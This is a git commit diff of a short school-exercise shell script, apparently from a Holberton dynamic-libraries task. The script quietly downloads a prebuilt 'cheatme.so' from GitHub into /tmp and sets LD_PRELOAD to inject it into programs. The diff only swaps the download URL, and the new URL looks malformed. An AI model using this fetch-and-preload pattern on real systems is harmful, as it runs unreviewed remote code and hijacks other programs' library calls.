dc16dc8ccde9dd2dc967ba5439c4f890b72818cb
AbiollaghJames <abiollajames@protonmail.com>
2023-03-20 13:13:20 -0700

    task 3

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q -O /tmp/cheatme.so https://github.com/rolandoquiroz/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/cheatme.so
+wget -q -O /tmp/cheatme.so https://github.com/holbertonschool/raw/master/0x18-dynamic_libraries/cheatme.so
 export LD_PRELOAD=/tmp/cheatme.so
